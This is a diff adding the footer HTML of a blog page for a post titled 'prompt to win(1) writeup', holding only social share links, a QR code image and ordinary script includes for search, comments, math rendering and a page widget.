+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/12/23/prompt/&title=《prompt to win(1) writeup》 — CherryGk's Blog&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/12/23/prompt/&title=《prompt to win(1) writeup》 — CherryGk's Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/12/23/prompt/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《prompt to win(1) writeup》 — CherryGk's Blog&url=http://yoursite.com/2018/12/23/prompt/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/12/23/prompt/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABxUlEQVR42u3aS27DMAwFwNz/0i7QVYHWxKN+doHRKlAUeZwFIZL6fOJxfY/fMz/n68/1zOKBi4s7zb3KUXOTffLXq3fAxcU9z62DVx568let19zO4+LivoybfFu/UvdXuLi47+fWh5I8ccLFxf0v3Dx1yROb+fW4uLhPcbsF0x2fN9Z3cXFxm9yrOZIDULJ+8Om4uLhHuHmbJA89+W/zRktjI1xc3KXcbipSB6yxQklUcMHFxT3CHQttOTcps3aveuDi4u7mzoSVmctYeTBdFgVxcXEDbn2MyIuejf8mDmd/7IOLi3uEu+A0NLQy75I0ujq4uLjbuPmm+Zr5QgkuLu6z3G7Do9t2zcsotypcXNzN3LGSZff/yBMhXFzcd3K7TdOxINU9DOHi4p7kdksh+XXM+QNTVDDFxcXdwO1elZhvmuZPwcXFfZbbvYQxs77bbsHFxX2Km4+xqxh5UXWwE4uLi7uU2w0oeaozsz7fARcXdx93LHitSoHqw9BtFQcXF/cId/46RX7ZYjD5wcXFfSW3247NW7ONpAgXF/f13Bq9+HCDi4t7nNtodgYz3WJro7CCi4t7hLu2YJq3V+fLLri4uBu4X5nABhw1p6t1AAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/jquery.swipebox.min.js?v=1.3.2"></script>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.3.2"></script>
+
+<!-- third-party -->
+<script type="text/javascript">
+;( function( $ ) {
+
+	$( '.swipebox' ).swipebox({
+		hideCloseButtonOnMobile: true
+	});
+
+} )( jQuery );
+</script>
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script type="text/javascript" src="/js/plugins/valine.js?v=1.3.2"></script>
+    
+    
+
+
+
+<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.3.2"></script>
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+    <script type="text/javascript">
+  daovoice('init', {
+    app_id: "c1ada43c"
+  });
+  daovoice('update');
+</script>
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/hijiki.model.json"},"display":{"position":"right","width":120,"height":240},"mobile":{"show":true},"log":false});</script></body>
+</html>
